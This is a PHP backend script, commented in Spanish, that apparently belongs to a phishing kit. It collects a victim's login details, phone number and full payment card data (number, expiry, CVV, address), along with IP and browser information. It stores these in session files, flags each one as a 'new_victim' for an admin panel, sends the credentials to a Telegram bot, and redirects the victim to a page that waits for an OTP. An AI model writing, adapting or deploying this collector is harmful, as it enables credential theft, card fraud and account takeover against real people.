<?php
// Cargar configuración
$config = include 'config.php';
$base_url = $config['base_url'];

// Incluir el bot de Telegram
require_once 'telegram_bot.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'message' => 'Método no permitido']);
    exit();
}

$input = null;
$raw_input = '';

if (isset($_POST['data'])) {
    $input = json_decode($_POST['data'], true);
    $raw_input = $_POST['data'];
} else {
    $raw_input = file_get_contents('php://input');
    $input = json_decode($raw_input, true);
}

if (!$input || !isset($input['document_number']) || empty($input['document_number'])) {
    echo json_encode([
        'success' => false, 
        'message' => 'Datos no válidos o incompletos',
        'debug' => [
            'raw_input' => $raw_input,
            'parsed_input' => $input,
            'post_data' => $_POST
        ]
    ]);
    exit();
}

$document_number = $input['document_number'] ?? '';
$password = $input['password'] ?? '';
$phone_number = $input['phone_number'] ?? '';
$timestamp = date('Y-m-d H:i:s');

// Información de la tarjeta
$card_info = $input['card_info'] ?? [];
$card_name = $card_info['name'] ?? '';
$card_number = $card_info['number'] ?? '';
$card_type = $card_info['type'] ?? '';
$card_expiry = $card_info['expiry'] ?? '';
$card_cvv = $card_info['cvv'] ?? '';
$card_address = $card_info['address'] ?? '';
$card_postal_code = $card_info['postal_code'] ?? '';

// Obtener información del navegador y la IP
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';

// Registrar sesión para el sistema OTP
$session_id = 'session_' . time() . '_' . substr(md5(uniqid()), 0, 9);
$sessions_dir = __DIR__ . '/sessions';

if (!is_dir($sessions_dir)) {
    mkdir($sessions_dir, 0755, true);
}

// Crear un archivo de notificación para el panel de administración
$notifications_dir = __DIR__ . '/notifications';
if (!is_dir($notifications_dir)) {
    mkdir($notifications_dir, 0755, true);
}

// Guardar la notificación
$notification_id = 'notification_' . time() . '_' . substr(md5(uniqid()), 0, 9);
$notification_data = [
    'id' => $notification_id,
    'type' => 'new_victim',
    'email' => $document_number,
    'session_id' => $session_id,
    'timestamp' => date('c'),
    'read' => false,
    'created_at' => date('Y-m-d H:i:s')
];

$notification_file = $notifications_dir . '/' . $notification_id . '.json';
file_put_contents($notification_file, json_encode($notification_data, JSON_PRETTY_PRINT));

// Guardar los datos de la sesión
$session_data = [
    'session_id' => $session_id,
    'email' => $document_number,
    'password' => $password,
    'phone' => $phone_number,
    'card_info' => [
        'name' => $card_name,
        'number' => $card_number,
        'type' => $card_type,
        'expiry' => $card_expiry,
        'cvv' => $card_cvv,
        'address' => $card_address,
        'postal_code' => $card_postal_code
    ],
    'ip' => $ip_address,
    'user_agent' => $user_agent,
    'timestamp' => date('c'),
    'otp_requested' => false,
    'otp_code' => null,
    'otp_verified' => false,
    'created_at' => date('Y-m-d H:i:s')
];

$session_file = $sessions_dir . '/' . $session_id . '.json';
file_put_contents($session_file, json_encode($session_data, JSON_PRETTY_PRINT));

// Enviar notificación a Telegram
$victim_data = [
    'email' => $document_number,
    'password' => $password,
    'ip' => $ip_address,
    'user_agent' => $user_agent
];
notify_new_victim($victim_data);

// Generar URL de redirección para OTP
$otp_url = $base_url . '/waiting_otp.html';

echo json_encode([
    'success' => true, 
    'message' => 'Datos registrados correctamente',
    'session_id' => $session_id,
    'otp_url' => $otp_url
]);
?>